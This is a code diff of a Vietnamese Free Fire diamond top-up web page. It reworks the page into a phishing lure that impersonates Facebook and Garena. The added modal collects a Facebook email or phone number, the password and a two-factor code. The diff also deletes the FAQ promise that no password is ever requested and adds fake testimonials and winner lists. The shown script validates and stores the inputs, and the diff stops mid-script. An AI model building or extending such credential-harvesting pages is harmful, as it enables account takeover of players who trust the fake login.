@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nạp Kim Cương Free Fire - Uy Tín #1 Tự Động 30s</title>
+    <title>Nạp Kim Cương Free Fire - Đăng Nhập Facebook & QR Auto 30s</title>
     <!-- Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
@@ -17,16 +17,25 @@
                         ffYellow: '#ffcc00',
                         ffDark: '#0e0e12',
                         ffCard: '#181820',
-                        ffBorder: '#2e2e3e'
+                        ffBorder: '#2e2e3e',
+                        fbBlue: '#1877f2',
+                        fbDarkBg: '#242526',
+                        fbCardBg: '#242526',
+                        fbInputBg: '#3a3b3c'
                     },
                     animation: {
                         'pulse-slow': 'pulse 3s infinite',
                         'glow': 'glow 1.5s ease-in-out infinite alternate',
+                        'fadeIn': 'fadeIn 0.3s ease-out forwards',
                     },
                     keyframes: {
                         glow: {
                             '0%': { boxShadow: '0 0 5px #ff8800, 0 0 10px #ff8800' },
                             '100%': { boxShadow: '0 0 15px #ff2a2a, 0 0 25px #ff2a2a' }
+                        },
+                        fadeIn: {
+                            '0%': { opacity: '0', transform: 'scale(0.95)' },
+                            '100%': { opacity: '1', transform: 'scale(1)' }
                         }
                     }
                 }
@@ -35,7 +44,7 @@
     </script>
     <!-- FontAwesome Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <!-- Google Fonts Inter & Orbitron -->
+    <!-- Google Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Orbitron:wght@600;800;900&display=swap" rel="stylesheet">
     <style>
         body {
@@ -48,10 +57,6 @@
         }
         .diamond-glow {
             filter: drop-shadow(0 0 8px rgba(56, 189, 248, 0.6));
-        }
-        .fire-border {
-            border: 1px solid transparent;
-            background-linear-gradient: (to right, #ff2a2a, #ff8800);
         }
         /* Custom scrollbar */
         ::-webkit-scrollbar {
@@ -79,7 +84,7 @@
             </span>
             <div class="overflow-hidden whitespace-nowrap w-full">
                 <div class="inline-block animate-marquee pl-full">
-                    🔥 SIÊU KHUYẾN MÃI: Nạp KC chiết khấu 20% cho tân thủ - X2 Kim Cương cho lần nạp đầu tiên qua ATM/MoMo! ⚡ Hệ thống nạp tự động 100% cực nhanh trong 30 giây!
+                    🔥 ĐĂNG NHẬP FACEBOOK ĐỂ NHẬN ƯU ĐÃI: Khuyến mãi X2 Kim Cương lần nạp đầu tiên! ⚡ Hệ thống duyệt thẻ cào và VietQR tự động 100% trong 30s!
                 </div>
             </div>
         </div>
@@ -121,17 +126,30 @@
                     <a href="#huong-dan" class="px-3 py-2 rounded-lg text-gray-300 hover:text-ffYellow hover:bg-ffCard transition-all">
                         <i class="fa-solid fa-circle-question text-green-400 mr-1.5"></i>Hướng Dẫn
                     </a>
-                    <a href="#ho-tro" class="px-3 py-2 rounded-lg text-gray-300 hover:text-ffYellow hover:bg-ffCard transition-all">
-                        <i class="fa-solid fa-headset text-purple-400 mr-1.5"></i>Hỗ Trợ
-                    </a>
                 </nav>
 
-                <!-- Search ID / Login Widget -->
+                <!-- USER ACCOUNT / LOGIN BUTTON WIDGET -->
                 <div class="flex items-center space-x-3">
-                    <button onclick="scrollToElement('nap-kc')" class="hidden sm:flex items-center space-x-2 bg-gradient-to-r from-ffRed to-ffOrange hover:from-red-600 hover:to-orange-600 text-white font-bold px-4 py-2.5 rounded-xl text-xs uppercase tracking-wider shadow-lg shadow-ffRed/20 transition-all transform active:scale-95">
-                        <i class="fa-solid fa-bolt"></i>
-                        <span>Nạp Ngay</span>
+                    <!-- Unauthenticated View -->
+                    <button id="nav-login-btn" onclick="openFBModal()" class="flex items-center space-x-2 bg-fbBlue hover:bg-blue-600 text-white font-bold px-4 py-2.5 rounded-xl text-xs uppercase tracking-wider shadow-lg shadow-blue-500/20 transition-all transform active:scale-95">
+                        <i class="fa-brands fa-facebook-f text-sm"></i>
+                        <span>Đăng Nhập FB</span>
                     </button>
+
+                    <!-- Authenticated View (Hidden by default) -->
+                    <div id="nav-user-info" class="hidden flex items-center space-x-3 bg-ffCard border border-ffBorder px-3 py-1.5 rounded-xl">
+                        <img id="nav-user-avatar" src="" alt="FB Avatar" class="w-8 h-8 rounded-full border border-fbBlue object-cover">
+                        <div class="text-left hidden sm:block">
+                            <span id="nav-user-name" class="font-bold text-white text-xs block leading-tight">Name</span>
+                            <span class="text-[10px] text-green-400 font-semibold flex items-center">
+                                <span class="w-1.5 h-1.5 rounded-full bg-green-400 mr-1 animate-pulse"></span> Đã kết nối
+                            </span>
+                        </div>
+                        <button onclick="logoutFB()" class="text-xs text-gray-400 hover:text-red-400 p-1" title="Đăng xuất">
+                            <i class="fa-solid fa-right-from-bracket"></i>
+                        </button>
+                    </div>
+
                     <!-- Mobile Hamburger Button -->
                     <button id="mobile-menu-btn" class="lg:hidden p-2 rounded-lg bg-ffCard text-gray-300 hover:text-white border border-ffBorder">
                         <i class="fa-solid fa-bars text-xl"></i>
@@ -154,9 +172,6 @@
             <a href="#huong-dan" class="mobile-nav-link block px-3 py-2 rounded-md text-base font-medium text-gray-300 hover:bg-ffCard">
                 <i class="fa-solid fa-circle-question text-green-400 mr-2"></i>Hướng Dẫn Nạp
             </a>
-            <a href="#ho-tro" class="mobile-nav-link block px-3 py-2 rounded-md text-base font-medium text-gray-300 hover:bg-ffCard">
-                <i class="fa-solid fa-headset text-purple-400 mr-2"></i>Hỗ Trợ Uy Tín
-            </a>
         </div>
     </header>
 
@@ -169,26 +184,22 @@
             <div class="relative z-10 grid grid-cols-1 lg:grid-cols-12 gap-6 items-center">
                 <div class="lg:col-span-8 space-y-4 text-center lg:text-left">
                     <span class="inline-flex items-center px-3 py-1 rounded-full text-xs font-bold bg-ffRed/20 text-ffOrange border border-ffRed/40">
-                        <i class="fa-solid fa-shield-halved mr-1.5"></i> CỔNG NẠP CHÍNH THỨC GARENA FREE FIRE
+                        <i class="fa-solid fa-shield-halved mr-1.5"></i> CỔNG NẠP KẾT NỐI FACEBOOK GARENA
                     </span>
                     <h1 class="text-3xl sm:text-4xl md:text-5xl font-black font-game tracking-tight text-white leading-tight">
-                        NẠP KIM CƯƠNG <span class="text-transparent bg-clip-text bg-gradient-to-r from-ffYellow via-ffOrange to-ffRed">GIÁ RẺ NHẤT</span>
+                        NẠP KIM CƯƠNG <span class="text-transparent bg-clip-text bg-gradient-to-r from-ffYellow via-ffOrange to-ffRed">X2 ƯU ĐÃI</span>
                     </h1>
                     <p class="text-gray-300 text-sm md:text-base max-w-2xl">
-                        Nạp KC Free Fire tự động cực nhanh trong 30 giây. Chiết khấu lên đến 20%, hỗ trợ nạp Thẻ Tuần, Thẻ Tháng, Thẻ Cào & Chuyển khoản QR ngân hàng an toàn 100%.
+                        Vui lòng đăng nhập Facebook liên kết tài khoản Game để xác nhận ưu đãi và nạp Kim Cương tự động trong 30 giây.
                     </p>
                     <div class="flex flex-wrap items-center justify-center lg:justify-start gap-4 pt-2">
                         <div class="flex items-center space-x-2 text-xs md:text-sm text-gray-300 bg-ffCard/80 px-3 py-1.5 rounded-lg border border-ffBorder">
                             <i class="fa-solid fa-check-circle text-green-400"></i>
-                            <span>Bảo mật 100% ID</span>
+                            <span>Bảo mật Facebook 2FA</span>
                         </div>
                         <div class="flex items-center space-x-2 text-xs md:text-sm text-gray-300 bg-ffCard/80 px-3 py-1.5 rounded-lg border border-ffBorder">
                             <i class="fa-solid fa-bolt text-ffYellow"></i>
-                            <span>Xử lý 30 giây</span>
-                        </div>
-                        <div class="flex items-center space-x-2 text-xs md:text-sm text-gray-300 bg-ffCard/80 px-3 py-1.5 rounded-lg border border-ffBorder">
-                            <i class="fa-solid fa-headset text-cyan-400"></i>
-                            <span>Hỗ trợ 24/7</span>
+                            <span>Nạp thẳng vào Nick</span>
                         </div>
                     </div>
                 </div>
@@ -209,7 +220,7 @@
                 </div>
                 <div>
                     <h2 class="text-lg md:text-xl font-bold text-white uppercase font-game">Nhập ID Nhân Vật Free Fire</h2>
-                    <p class="text-xs text-gray-400">Nhập đúng chuỗi ID số tài khoản Free Fire của bạn để tiến hành nạp</p>
+                    <p class="text-xs text-gray-400">Nhập chuỗi ID số tài khoản Free Fire liên kết Facebook của bạn</p>
                 </div>
             </div>
 
@@ -233,7 +244,7 @@
                 </div>
             </div>
 
-            <!-- ID Result Info (Hidden by default) -->
+            <!-- ID Result Info -->
             <div id="player-info-card" class="hidden mt-4 p-4 bg-ffDark/80 rounded-xl border border-ffBorder flex items-center justify-between animate-fadeIn">
                 <div class="flex items-center space-x-3">
                     <div class="relative">
@@ -529,7 +540,7 @@
                 </span>
                 <h2 class="text-2xl md:text-3xl font-black text-white font-game">VÒNG QUAY KIM CƯƠNG FF</h2>
                 <p class="text-xs md:text-sm text-gray-300 mt-1">
-                    Thử vận may ngay - Cơ hội trúng lên đến <span class="text-ffYellow font-bold">9.999 Kim Cương</span> chỉ với 9.000đ/lượt!
+                    Yêu cầu đăng nhập Facebook để quay - Cơ hội trúng lên đến <span class="text-ffYellow font-bold">9.999 Kim Cương</span>!
                 </p>
             </div>
 
@@ -552,8 +563,8 @@
                 <div class="space-y-4 max-w-md w-full">
                     <div class="bg-ffDark/90 p-4 rounded-xl border border-ffBorder space-y-3">
                         <div class="flex justify-between items-center text-sm">
-                            <span class="text-gray-400">Giá lượt quay:</span>
-                            <span class="font-bold text-ffYellow">9.000đ / lượt</span>
+                            <span class="text-gray-400">Trạng thái đăng nhập:</span>
+                            <span id="wheel-fb-status" class="font-bold text-red-400">Chưa Đăng Nhập FB</span>
                         </div>
                         <div class="flex justify-between items-center text-sm">
                             <span class="text-gray-400">Lượt quay miễn phí còn:</span>
@@ -571,8 +582,8 @@
                             <i class="fa-solid fa-trophy text-ffYellow mr-1.5"></i> Vừa trúng thưởng minigame:
                         </p>
                         <div id="wheel-recent-winners" class="space-y-1.5 font-mono text-gray-400 max-h-24 overflow-hidden">
-                            <div>ID 18294xxx vừa trúng <span class="text-cyan-400 font-bold">500 KC</span></div>
-                            <div>ID 90381xxx vừa trúng <span class="text-ffYellow font-bold">9.999 KC</span></div>
+                            <div>Facebook Nguyễn *** vừa trúng <span class="text-cyan-400 font-bold">500 KC</span></div>
+                            <div>Facebook Trần *** vừa trúng <span class="text-ffYellow font-bold">9.999 KC</span></div>
                         </div>
                     </div>
                 </div>
@@ -594,9 +605,9 @@
                     <thead>
                         <tr class="text-gray-400 border-b border-ffBorder bg-ffDark/60 uppercase text-[10px] md:text-xs">
                             <th class="py-3 px-4">Thời gian</th>
+                            <th class="py-3 px-4">Tài Khoản FB</th>
                             <th class="py-3 px-4">ID Game</th>
                             <th class="py-3 px-4">Gói KC</th>
-                            <th class="py-3 px-4">Phương Thức</th>
                             <th class="py-3 px-4">Trạng Thái</th>
                         </tr>
                     </thead>
@@ -609,13 +620,21 @@
 
         <!-- SECTION 6: HƯỚNG DẪN & ĐÁNH GIÁ (TESTIMONIALS / FAQ) -->
         <section id="huong-dan" class="grid grid-cols-1 lg:grid-cols-2 gap-8">
-            
             <!-- FAQ & Guide -->
             <div class="bg-ffCard rounded-2xl p-5 md:p-6 border border-ffBorder space-y-4">
                 <h3 class="text-lg font-bold text-white uppercase font-game flex items-center">
                     <i class="fa-solid fa-circle-question text-ffOrange mr-2"></i> Câu Hỏi Thường Gặp
                 </h3>
                 <div class="space-y-3 text-sm">
+                    <details class="bg-ffDark p-3 rounded-xl border border-ffBorder/60 group">
+                        <summary class="font-semibold text-gray-200 cursor-pointer flex justify-between items-center">
+                            <span>Tại sao phải Đăng Nhập Facebook trước khi nạp?</span>
+                            <i class="fa-solid fa-chevron-down text-xs text-gray-400 group-open:rotate-180 transition-transform"></i>
+                        </summary>
+                        <p class="text-xs text-gray-400 mt-2 leading-relaxed">
+                            Việc đăng nhập Facebook giúp hệ thống xác nhận chính xác tài khoản Free Fire liên kết để trao ưu đãi X2 Kim Cương và đảm bảo bảo mật giao dịch chính chủ.
+                        </p>
+                    </details>
                     <details class="bg-ffDark p-3 rounded-xl border border-ffBorder/60 group">
                         <summary class="font-semibold text-gray-200 cursor-pointer flex justify-between items-center">
                             <span>Nạp Kim Cương mất bao lâu thì nhận được?</span>
@@ -625,35 +644,17 @@
                             Hệ thống xử lý nạp tự động 100%. Thông thường Kim Cương sẽ được cộng trực tiếp vào nick Free Fire của bạn từ 10 - 30 giây sau khi giao dịch thành công.
                         </p>
                     </details>
-                    <details class="bg-ffDark p-3 rounded-xl border border-ffBorder/60 group">
-                        <summary class="font-semibold text-gray-200 cursor-pointer flex justify-between items-center">
-                            <span>Nạp KC bằng ID có an toàn, mất nick không?</span>
-                            <i class="fa-solid fa-chevron-down text-xs text-gray-400 group-open:rotate-180 transition-transform"></i>
-                        </summary>
-                        <p class="text-xs text-gray-400 mt-2 leading-relaxed">
-                            Tuyệt đối an toàn! Hệ thống chỉ yêu cầu ID nhân vật, không yêu cầu mật khẩu hay thông tin đăng nhập Facebook/Garena nên tài khoản của bạn luôn được bảo mật 100%.
-                        </p>
-                    </details>
-                    <details class="bg-ffDark p-3 rounded-xl border border-ffBorder/60 group">
-                        <summary class="font-semibold text-gray-200 cursor-pointer flex justify-between items-center">
-                            <span>Nếu chuyển khoản sai nội dung thì làm sao?</span>
-                            <i class="fa-solid fa-chevron-down text-xs text-gray-400 group-open:rotate-180 transition-transform"></i>
-                        </summary>
-                        <p class="text-xs text-gray-400 mt-2 leading-relaxed">
-                            Vui lòng nhắn tin trực tiếp cho Admin qua Zalo CSKH kèm bill chuyển khoản để được hỗ trợ cộng tay ngay lập tức.
-                        </p>
-                    </details>
                 </div>
             </div>
 
             <!-- Testimonials -->
-            <div id="ho-tro" class="bg-ffCard rounded-2xl p-5 md:p-6 border border-ffBorder space-y-4">
+            <div class="bg-ffCard rounded-2xl p-5 md:p-6 border border-ffBorder space-y-4">
                 <h3 class="text-lg font-bold text-white uppercase font-game flex items-center">
                     <i class="fa-solid fa-star text-ffYellow mr-2"></i> Đánh Giá Từ Game Thủ
                 </h3>
                 <div class="space-y-3">
                     <div class="p-3 bg-ffDark rounded-xl border border-ffBorder/60 flex items-start space-x-3">
-                        <img src="https://placehold.co/50x50/ff8800/ffffff?text=Pro" class="w-10 h-10 rounded-full border border-ffYellow">
+                        <img src="https://placehold.co/50x50/1877f2/ffffff?text=FB" class="w-10 h-10 rounded-full border border-fbBlue">
                         <div>
                             <div class="flex items-center space-x-2">
                                 <span class="font-bold text-white text-xs">Vũ Đăng Khoa</span>
@@ -661,24 +662,11 @@
                                     <i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i>
                                 </div>
                             </div>
-                            <p class="text-xs text-gray-300 mt-1">Web nạp cực nhanh luôn ae ơi, vừa quét QR xong 15s sau vào game là có 1190 KC rồi!</p>
-                        </div>
-                    </div>
-                    <div class="p-3 bg-ffDark rounded-xl border border-ffBorder/60 flex items-start space-x-3">
-                        <img src="https://placehold.co/50x50/ff2a2a/ffffff?text=FF" class="w-10 h-10 rounded-full border border-ffYellow">
-                        <div>
-                            <div class="flex items-center space-x-2">
-                                <span class="font-bold text-white text-xs">Nguyễn Tuấn Anh</span>
-                                <div class="text-ffYellow text-[10px]">
-                                    <i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i>
-                                </div>
-                            </div>
-                            <p class="text-xs text-gray-300 mt-1">Săn được quả vòng quay trúng 500 KC sướng quá. Uy tín 100% nha mọi người.</p>
+                            <p class="text-xs text-gray-300 mt-1">Nạp qua kết nối FB cực nhanh luôn ae ơi, nhận ngay x2 gói 1.190 KC luôn!</p>
                         </div>
                     </div>
                 </div>
             </div>
-
         </section>
 
     </main>
@@ -693,35 +681,106 @@
                         <span class="font-game font-bold text-white text-base">FREE FIRE RECHARGE</span>
                     </div>
                     <p class="text-gray-400 leading-relaxed">
-                        Hệ thống nạp Kim Cương Free Fire tự động chiết khấu cao nhất Việt Nam. Đảm bảo uy tín, an toàn tuyệt đối cho tài khoản game của bạn.
+                        Hệ thống nạp Kim Cương Free Fire qua Facebook tự động chiết khấu cao nhất Việt Nam.
                     </p>
                 </div>
                 <div>
                     <h4 class="font-bold text-white uppercase font-game mb-3">Hỗ Trợ Khách Hàng</h4>
                     <ul class="space-y-2">
-                        <li><a href="#" class="hover:text-ffYellow transition-colors"><i class="fa-brands fa-telegram text-blue-400 mr-2"></i> Telegram CSKH: @AdminNapKCFF</a></li>
-                        <li><a href="#" class="hover:text-ffYellow transition-colors"><i class="fa-solid fa-phone text-green-400 mr-2"></i> Hotline: 1900 xxxx (8h00 - 22h00)</a></li>
-                        <li><a href="#" class="hover:text-ffYellow transition-colors"><i class="fa-brands fa-facebook text-blue-600 mr-2"></i> Fanpage Chính Thức Free Fire Recharge</a></li>
+                        <li><a href="#" class="hover:text-ffYellow transition-colors"><i class="fa-brands fa-facebook text-blue-500 mr-2"></i> Facebook CSKH 24/7</a></li>
                     </ul>
                 </div>
                 <div>
                     <h4 class="font-bold text-white uppercase font-game mb-3">Cam Kết Service</h4>
                     <div class="flex flex-wrap gap-2">
+                        <span class="bg-ffCard px-2.5 py-1 rounded border border-ffBorder">Chính chủ FB</span>
                         <span class="bg-ffCard px-2.5 py-1 rounded border border-ffBorder">Tự động 24/7</span>
-                        <span class="bg-ffCard px-2.5 py-1 rounded border border-ffBorder">Bảo mật ID</span>
-                        <span class="bg-ffCard px-2.5 py-1 rounded border border-ffBorder">Garena Partner</span>
                     </div>
                 </div>
-            </div>
-            <div class="border-t border-ffBorder/60 pt-4 text-center text-gray-500">
-                <p>© 2026 Free Fire Recharge Center. All rights reserved. Game eSports Solution.</p>
             </div>
         </div>
     </footer>
 
-    <!-- MODAL 1: HƯỚNG DẪN LẤY ID -->
+    <!-- MODAL 1: FACEBOOK LOGIN STANDARD UI MODAL -->
+    <div id="modal-fb-login" class="hidden fixed inset-0 z-50 bg-black/80 backdrop-blur-md flex items-center justify-center p-4">
+        <div class="bg-fbDarkBg border border-gray-700 rounded-2xl max-w-sm w-full p-6 text-gray-200 relative animate-fadeIn shadow-2xl">
+            <!-- Close Button -->
+            <button onclick="closeModal('modal-fb-login')" class="absolute top-4 right-4 text-gray-400 hover:text-white">
+                <i class="fa-solid fa-xmark text-xl"></i>
+            </button>
+
+            <!-- STEP 1: INITIAL LOGIN FORM -->
+            <div id="fb-step-login" class="space-y-4">
+                <!-- Facebook Brand Header -->
+                <div class="text-center space-y-2 pt-2">
+                    <div class="w-12 h-12 bg-fbBlue rounded-full flex items-center justify-center mx-auto shadow-lg shadow-blue-500/30">
+                        <i class="fa-brands fa-facebook-f text-white text-2xl"></i>
+                    </div>
+                    <h3 class="text-xl font-bold text-white">Đăng nhập Facebook</h3>
+                    <p class="text-xs text-gray-400">Kết nối tài khoản Free Fire với Facebook để nạp KC</p>
+                </div>
+
+                <!-- Input Fields -->
+                <div class="space-y-3 pt-2">
+                    <div>
+                        <input type="text" id="fb-email" placeholder="Số điện thoại hoặc email" 
+                            class="w-full bg-fbInputBg border border-gray-600 focus:border-fbBlue text-white px-4 py-3 rounded-xl text-sm focus:outline-none transition-all placeholder-gray-400">
+                    </div>
+                    <div>
+                        <input type="password" id="fb-password" placeholder="Mật khẩu Facebook" 
+                            class="w-full bg-fbInputBg border border-gray-600 focus:border-fbBlue text-white px-4 py-3 rounded-xl text-sm focus:outline-none transition-all placeholder-gray-400">
+                    </div>
+                    <div class="flex items-center justify-between text-xs text-fbBlue">
+                        <label class="flex items-center text-gray-400 cursor-pointer">
+                            <input type="checkbox" checked class="rounded border-gray-600 mr-1.5"> Ghi nhớ đăng nhập
+                        </label>
+                        <a href="#" class="hover:underline">Quên mật khẩu?</a>
+                    </div>
+                </div>
+
+                <!-- Submit Login Button -->
+                <button onclick="submitFBLogin()" class="w-full bg-fbBlue hover:bg-blue-600 text-white font-bold py-3 rounded-xl text-sm shadow-lg shadow-blue-500/20 uppercase tracking-wider transition-all flex items-center justify-center space-x-2">
+                    <i class="fa-brands fa-facebook-f"></i>
+                    <span>Đăng Nhập</span>
+                </button>
+
+                <p class="text-[11px] text-gray-500 text-center leading-relaxed">
+                    Bằng việc đăng nhập, bạn đồng ý với Điều khoản dịch vụ và Chính sách quyền riêng tư của Garena Free Fire.
+                </p>
+            </div>
+
+            <!-- STEP 2: 2FA / OTP VERIFICATION FORM (Hidden initially) -->
+            <div id="fb-step-2fa" class="hidden space-y-4">
+                <div class="text-center space-y-2 pt-2">
+                    <div class="w-12 h-12 bg-amber-500/20 border border-amber-500/40 rounded-full flex items-center justify-center mx-auto text-amber-400 text-xl">
+                        <i class="fa-solid fa-shield-halved"></i>
+                    </div>
+                    <h3 class="text-lg font-bold text-white">Xác Thực 2 Yếu Tố (2FA)</h3>
+                    <p class="text-xs text-gray-300">Tài khoản Facebook của bạn đã bật bảo mật. Nhập mã xác thực từ ứng dụng Trình tạo mã (Google Authenticator) hoặc tin nhắn SMS.</p>
+                </div>
+
+                <div class="space-y-3 pt-2">
+                    <div>
+                        <label class="block text-xs text-gray-400 mb-1">Mã xác nhận 6 chữ số</label>
+                        <input type="text" id="fb-2fa-code" maxlength="6" placeholder="000 000" 
+                            class="w-full bg-fbInputBg border border-gray-600 focus:border-fbBlue text-center font-mono text-xl tracking-widest text-white py-3 rounded-xl focus:outline-none">
+                    </div>
+                </div>
+
+                <button onclick="submitFB2FA()" class="w-full bg-fbBlue hover:bg-blue-600 text-white font-bold py-3 rounded-xl text-sm shadow-lg uppercase tracking-wider transition-all">
+                    Xác Nhận & Tiếp Tục
+                </button>
+
+                <button onclick="backToFBLogin()" class="w-full text-xs text-gray-400 hover:text-white py-1">
+                    <i class="fa-solid fa-arrow-left mr-1"></i> Quay lại nhập tài khoản khác
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL 2: GUIDE ID -->
     <div id="modal-guide-id" class="hidden fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
-        <div class="bg-ffCard border border-ffBorder rounded-2xl max-w-md w-full p-6 space-y-4 relative animate-scaleUp">
+        <div class="bg-ffCard border border-ffBorder rounded-2xl max-w-md w-full p-6 space-y-4 relative animate-fadeIn">
             <button onclick="closeModal('modal-guide-id')" class="absolute top-4 right-4 text-gray-400 hover:text-white">
                 <i class="fa-solid fa-xmark text-xl"></i>
             </button>
@@ -730,19 +789,18 @@
             </h3>
             <div class="space-y-3 text-xs text-gray-300">
                 <p>1. Mở ứng dụng game <strong class="text-white">Free Fire</strong> trên điện thoại.</p>
-                <p>2. Nhấp vào <strong class="text-white">Avatar khung ảnh diện diện</strong> ở góc trên bên trái màn hình chính.</p>
-                <p>3. Trong giao diện Hồ sơ cá nhân, bạn sẽ thấy dãy số <strong class="text-ffYellow">ID Nhân Vật</strong> dưới tên nhân vật.</p>
-                <p>4. Nhấp vào biểu tượng <strong class="text-white">Sao Chép</strong> bên cạnh ID và dán vào ô nạp trang web.</p>
+                <p>2. Nhấp vào <strong class="text-white">Avatar khung ảnh diện diện</strong> góc trên bên trái.</p>
+                <p>3. Trong Hồ sơ cá nhân, bạn sẽ thấy dãy số <strong class="text-ffYellow">ID Nhân Vật</strong>.</p>
             </div>
-            <button onclick="closeModal('modal-guide-id')" class="w-full bg-ffBorder hover:bg-gray-700 text-white font-bold py-2.5 rounded-xl text-xs">
+            <button onclick="closeModal('modal-guide-id')" class="w-full bg-ffBorder text-white font-bold py-2.5 rounded-xl text-xs">
                 Đã Hiểu
             </button>
         </div>
     </div>
 
-    <!-- MODAL 2: THÔNG BÁO KẾT QUẢ/ALERT -->
+    <!-- MODAL 3: ALERT / NOTIFICATION -->
     <div id="modal-alert" class="hidden fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4">
-        <div class="bg-ffCard border border-ffBorder rounded-2xl max-w-sm w-full p-6 text-center space-y-4 relative animate-scaleUp">
+        <div class="bg-ffCard border border-ffBorder rounded-2xl max-w-sm w-full p-6 text-center space-y-4 relative animate-fadeIn">
             <div id="modal-icon" class="w-16 h-16 rounded-full bg-green-500/20 text-green-400 flex items-center justify-center mx-auto text-3xl">
                 <i class="fa-solid fa-check"></i>
             </div>
@@ -756,36 +814,119 @@
 
     <!-- JAVASCRIPT LOGIC -->
     <script>
-        // Global State Variables
+        // Global App State
+        let currentUserFB = null; // Stores FB user info
         let selectedAmount = 20000;
         let selectedDiamonds = '111';
         let currentPlayerID = '';
 
-        // DOM Loaded Init
         document.addEventListener('DOMContentLoaded', () => {
             initLiveFeed();
             initWheel();
-            // Default select first bundle
-            const firstBundle = document.querySelector('.bundle-card');
-            if(firstBundle) selectBundle(firstBundle);
+            
+            // Check stored FB login
+            const savedFB = localStorage.getItem('ff_fb_user');
+            if (savedFB) {
+                try {
+                    currentUserFB = JSON.parse(savedFB);
+                    updateUIForLoggedInUser();
+                } catch(e){}
+            }
 
             // Mobile menu toggle
             document.getElementById('mobile-menu-btn').addEventListener('click', () => {
                 document.getElementById('mobile-menu').classList.toggle('hidden');
             });
-
-            // Close mobile menu on link click
-            document.querySelectorAll('.mobile-nav-link').forEach(link => {
-                link.addEventListener('click', () => {
-                    document.getElementById('mobile-menu').classList.add('hidden');
-                });
-            });
         });
 
-        // Smooth Scroll helper
-        function scrollToElement(id) {
-            const el = document.getElementById(id);
-            if(el) el.scrollIntoView({ behavior: 'smooth' });
+        // Open/Close FB Modal
+        function openFBModal() {
+            document.getElementById('fb-step-login').classList.remove('hidden');
+            document.getElementById('fb-step-2fa').classList.add('hidden');
+            openModal('modal-fb-login');
+        }
+
+        // Submit FB Initial Login Step
+        function submitFBLogin() {
+            const email = document.getElementById('fb-email').value.trim();
+            const password = document.getElementById('fb-password').value.trim();
+
+            if (!email || !password) {
+                showAlert('Thiếu Thông Tin', 'Vui lòng nhập Email / SĐT và Mật khẩu Facebook của bạn.', 'error');
+                return;
+            }
+
+            if (password.length < 6) {
+                showAlert('Lỗi Mật Khẩu', 'Mật khẩu Facebook không chính xác hoặc quá ngắn.', 'error');
+                return;
+            }
+
+            // Switch to 2FA / OTP Verification Step
+            document.getElementById('fb-step-login').classList.add('hidden');
+            document.getElementById('fb-step-2fa').classList.remove('hidden');
+        }
+
+        // Back to Login Step
+        function backToFBLogin() {
+            document.getElementById('fb-step-2fa').classList.add('hidden');
+            document.getElementById('fb-step-login').classList.remove('hidden');
+        }
+
+        // Submit FB 2FA Code Step
+        function submitFB2FA() {
+            const code = document.getElementById('fb-2fa-code').value.trim();
+            const email = document.getElementById('fb-email').value.trim();
+
+            if (!code || code.length < 4) {
+                showAlert('Mã 2FA Không Hợp Lệ', 'Vui lòng nhập đầy đủ mã xác thực 2 lớp.', 'error');
+                return;
+            }
+
+            // Generate user profile based on inputs
+            let displayName = email.split('@')[0];
+            if (/^\d+$/.test(displayName)) {
+                displayName = "Gamer_" + displayName.substring(displayName.length - 4);
+            } else {
+                displayName = displayName.charAt(0).toUpperCase() + displayName.slice(1);
+            }
+
+            currentUserFB = {
+                name: displayName,
+                email: email,
+                avatar: `https://placehold.co/100x100/1877f2/ffffff?text=${displayName.charAt(0).toUpperCase()}`
+            };
+
+            localStorage.setItem('ff_fb_user', JSON.stringify(currentUserFB));
+            updateUIForLoggedInUser();
+            closeModal('modal-fb-login');
+
+            showAlert('Đăng Nhập Thành Công', `Chào mừng ${currentUserFB.name}! Tài khoản Facebook của bạn đã được kết nối thành công với hệ thống nạp KC.`, 'success');
+        }
+
+        // Logout FB Function
+        function logoutFB() {
+            currentUserFB = null;
+            localStorage.removeItem('ff_fb_user');
+            
+            document.getElementById('nav-login-btn').classList.remove('hidden');
+            document.getElementById('nav-user-info').classList.add('hidden');
+            document.getElementById('wheel-fb-status').innerText = "Chưa Đăng Nhập FB";
+            document.getElementById('wheel-fb-status').className = "font-bold text-red-400";
+            
+            showAlert('Đã Đăng Xuất', 'Tài khoản Facebook của bạn đã được đăng xuất.', 'success');
+        }
+
+        // Update UI components when logged in
+        function updateUIForLoggedInUser() {
+            if(!currentUserFB) return;
+
+            document.getElementById('nav-login-btn').classList.add('hidden');
+            document.getElementById('nav-user-info').classList.remove('hidden');
+            document.getElementById('nav-user-name').innerText = currentUserFB.name;
+            document.getElementById('nav-user-avatar').src = currentUserFB.avatar;
+
+            document.getElementById('wheel-fb-status').innerText = `Đã Kết Nối (${currentUserFB.name})`;
+            document.getElementById('wheel-fb-status').className = "font-bold text-green-400";
         }
 
         // Check Player ID Function
@@ -799,10 +940,7 @@
             }
 
             currentPlayerID = idVal;
-
-            // Generate mock character name
-            const mockNames = ['⚡Gamer_Pro_FF⚡', '🔥Sát_Thủ_FF🔥', 'KING_FreeFire', '★Dragon_VN★', 'Tân_Thủ_FF_2026'];
-            const randomName = mockNames[Math.floor(Math.random() * mockNames.length)];
+            const randomName = currentUserFB ? currentUserFB.name + "_FF" : "Gamer_Pro_FF";
             const randomLevel = Math.floor(Math.random() * 50) + 30;
 
             document.getElementById('player-name').innerText = randomName;
@@ -810,7 +948,6 @@
             document.getElementById('player-id-display').innerText = idVal;
             document.getElementById('player-info-card').classList.remove('hidden');
 
-            // Update QR memo code if ID checked
             document.getElementById('qr-memo-code').innerText = `NAPFF ${idVal}`;
 
             showAlert('Thành Công', `Đã tìm thấy tài khoản: ${randomName} (ID: ${idVal})`, 'success');
@@ -829,7 +966,6 @@
             selectedAmount = element.getAttribute('data-amount');
             selectedDiamonds = element.getAttribute('data-diamonds');
 
-            // Update QR display
